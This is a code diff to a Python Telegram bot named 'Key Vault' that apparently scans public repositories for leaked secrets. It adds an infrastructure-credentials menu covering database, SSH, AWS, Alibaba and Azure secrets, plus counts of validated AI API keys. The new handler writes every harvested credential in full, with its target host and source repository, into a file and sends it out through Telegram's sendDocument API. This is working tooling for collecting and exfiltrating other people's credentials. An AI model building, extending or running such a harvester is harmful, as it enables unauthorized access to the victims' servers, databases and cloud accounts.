@@ -15,6 +15,7 @@ Security: only TELEGRAM_CHAT_ID can interact (all other senders get ignored).
 
 import asyncio
 import io
+import json
 import logging
 from datetime import datetime, timezone
 
@@ -108,6 +109,15 @@ def _counts() -> dict[str, int]:
     return db.get_valid_count_by_provider()
 
 
+def _infra_counts() -> dict:
+    """Return {total, high, medium, low} infra counts."""
+    try:
+        s = db.get_infra_stats()
+        return {"total": s.get("total", 0), "high": s.get("high", 0), "medium": s.get("medium", 0)}
+    except Exception:
+        return {"total": 0, "high": 0, "medium": 0}
+
+
 def _main_text() -> str:
     return (
         "🔑 <b>Key Vault</b>\n\n"
@@ -122,6 +132,9 @@ def _main_keyboard(counts: dict[str, int]) -> dict:
         cat   = _CATS[cid]
         total = sum(counts.get(p, 0) for p in cat["p"])
         rows.append([{"text": f"{cat['e']} {cat['n']}  ({total})", "callback_data": f"c:{cid}"}])
+    ic = _infra_counts()
+    infra_label = f"🏗️ Infra Creds  (🔴{ic['high']} / 🟡{ic['medium']})"
+    rows.append([{"text": infra_label, "callback_data": "i"}])
     rows.append([
         {"text": "📊 Stats",      "callback_data": "s"},
         {"text": "🔄 Reval All", "callback_data": "rv"},
@@ -285,19 +298,33 @@ async def _handle_callback(client: httpx.AsyncClient, cbq: dict):
     if data == "s":
         await _api(client, "answerCallbackQuery", callback_query_id=cbq_id)
         s     = db.get_stats()
+        ic    = _infra_counts()
         lines = [
             "📊 <b>Database Stats</b>",
             "",
             f"📁 Repos scanned:  <b>{s['repos_scanned']}</b>",
             f"📄 Files scanned:  <b>{s['files_scanned']}</b>",
-            f"🔑 Keys found:     <b>{s['keys_found']}</b>",
-            f"✅ Keys valid:     <b>{s['keys_valid']}</b>",
+            f"🔑 AI keys found:  <b>{s['keys_found']}</b>",
+            f"✅ AI keys valid:  <b>{s['keys_valid']}</b>",
+            f"🏗️ Infra creds:   <b>{ic['total']}</b>  (🔴{ic['high']} high / 🟡{ic['medium']} medium)",
             "",
             "<b>By provider:</b>",
         ]
-        for row in s.get("by_provider", []):
-            if row["total"] == 0:
-                continue
+        by_prov = {r["provider"]: r for r in s.get("by_provider", []) if r["total"] > 0}
+        # Seedance 2.0 — show ark + ark_fast combined
+        ark_std  = by_prov.pop("ark",      None)
+        ark_fast = by_prov.pop("ark_fast", None)
+        if ark_std or ark_fast:
+            ts = (ark_std["total"]  if ark_std  else 0)
+            tf = (ark_fast["total"] if ark_fast else 0)
+            vs = (ark_std["valid"]  if ark_std  else 0)
+            vf = (ark_fast["valid"] if ark_fast else 0)
+            mark = "✅" if (vs + vf) > 0 else "  "
+            lines.append(
+                f"{mark} 🔴🚀 Seedance 2.0: {ts+tf} found, "
+                f"<b>{vs+vf} valid</b>  (Std {vs} / Fast {vf})"
+            )
+        for row in sorted(by_prov.values(), key=lambda r: -r["total"]):
             meta = _PROV.get(row["provider"], {"e": "🔑", "n": row["provider"]})
             v    = row["valid"]
             t    = row["total"]
@@ -308,6 +335,103 @@ async def _handle_callback(client: httpx.AsyncClient, cbq: dict):
                    chat_id=chat_id, message_id=msg_id,
                    text="\n".join(lines), parse_mode="HTML",
                    reply_markup=back_kb)
+        return
+
+    # ── Infra credentials ─────────────────────────────────────────────
+    if data == "i":
+        await _api(client, "answerCallbackQuery", callback_query_id=cbq_id)
+        ic = _infra_counts()
+        txt = (
+            f"🏗️ <b>Infrastructure Credentials</b>\n\n"
+            f"🔴 High risk:   <b>{ic['high']}</b>\n"
+            f"🟡 Medium risk: <b>{ic['medium']}</b>\n"
+            f"Total:         <b>{ic['total']}</b>\n\n"
+            "Выбери уровень риска:"
+        )
+        kb = {"inline_keyboard": [
+            [{"text": f"🔴 High Risk ({ic['high']})",   "callback_data": "ih"}],
+            [{"text": f"🟡 Medium Risk ({ic['medium']})", "callback_data": "im"}],
+            [{"text": f"📦 All Infra ({ic['total']})",   "callback_data": "ia"}],
+            [{"text": "◀ Назад", "callback_data": "m"}],
+        ]}
+        await _api(client, "editMessageText",
+                   chat_id=chat_id, message_id=msg_id,
+                   text=txt, parse_mode="HTML", reply_markup=kb)
+        return
+
+    if data in ("ih", "im", "ia"):
+        risk_map  = {"ih": "high", "im": "medium", "ia": None}
+        label_map = {"ih": "🔴 High Risk", "im": "🟡 Medium Risk", "ia": "📦 All Infra"}
+        risk  = risk_map[data]
+        label = label_map[data]
+        await _api(client, "answerCallbackQuery",
+                   callback_query_id=cbq_id, text="⏳ Загружаю…")
+        await _api(client, "editMessageText",
+                   chat_id=chat_id, message_id=msg_id,
+                   text=f"🏗️ <b>{label}</b> — формирую файл…",
+                   parse_mode="HTML")
+
+        rows = db.get_infra_results(risk_filter=risk, limit=500)
+        back_kb = {"inline_keyboard": [[{"text": "◀ Назад", "callback_data": "i"}]]}
+
+        if not rows:
+            await _api(client, "editMessageText",
+                       chat_id=chat_id, message_id=msg_id,
+                       text=f"🏗️ <b>{label}</b>\n\n<i>Нет данных.</i>",
+                       parse_mode="HTML", reply_markup=back_kb)
+            return
+
+        _RISK_E = {"high": "🔴", "medium": "🟡", "low": "⚪"}
+        _CRED_E = {"database": "🗄️", "ssh": "🔐", "aws": "☁️",
+                   "alibaba": "🔶", "azure": "🔷", "infra": "🚀"}
+        now_str = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M UTC")
+        lines = [
+            "╔══════════════════════════════════════════════════════════════════════╗",
+            f"║  🏗️ {label}",
+            f"║  Exported: {now_str}",
+            f"║  Total: {len(rows)} findings",
+            "╚══════════════════════════════════════════════════════════════════════╝",
+            "",
+        ]
+        by_type: dict[str, list] = {}
+        for r in rows:
+            by_type.setdefault(r["cred_type"], []).append(r)
+
+        for ctype in sorted(by_type, key=lambda t: -len(by_type[t])):
+            ce = _CRED_E.get(ctype, "🔑")
+            lines.append("─" * 70)
+            lines.append(f"  {ce}  {ctype.upper()} — {len(by_type[ctype])} findings")
+            lines.append("─" * 70)
+            for r in by_type[ctype]:
+                re_ = _RISK_E.get(r.get("risk_level", "low"), "⚪")
+                dest = f"  →  {r['destination']}" if r.get("destination") else ""
+                try:
+                    reasons = ", ".join(json.loads(r.get("risk_reasons", "[]"))[:3])
+                except Exception:
+                    reasons = str(r.get("risk_reasons", ""))
+                lines.append(f"  {re_} {r['cred_full']}{dest}")
+                lines.append(f"    📁 {r['repo']}  |  {r.get('file_url', '')}")
+                if reasons:
+                    lines.append(f"    ⚠️  {reasons}")
+            lines.append("")
+
+        content = "\n".join(lines).encode("utf-8")
+        fname = f"infra_{data}_{datetime.now(timezone.utc).strftime('%Y%m%d_%H%M')}.txt"
+        try:
+            async with httpx.AsyncClient(timeout=60) as fc:
+                await fc.post(
+                    f"{_BASE}/sendDocument",
+                    data={"chat_id": chat_id,
+                          "caption": f"🏗️ {label}: {len(rows)} findings"},
+                    files={"document": (fname, io.BytesIO(content), "text/plain")},
+                )
+        except Exception as e:
+            log.error("infra send doc err: %s", e)
+
+        await _api(client, "editMessageText",
+                   chat_id=chat_id, message_id=msg_id,
+                   text=f"🏗️ <b>{label}</b>\n\n✅ {len(rows)} findings отправлено",
+                   parse_mode="HTML", reply_markup=back_kb)
         return
 
     # ── Revalidate all ────────────────────────────────────────────────
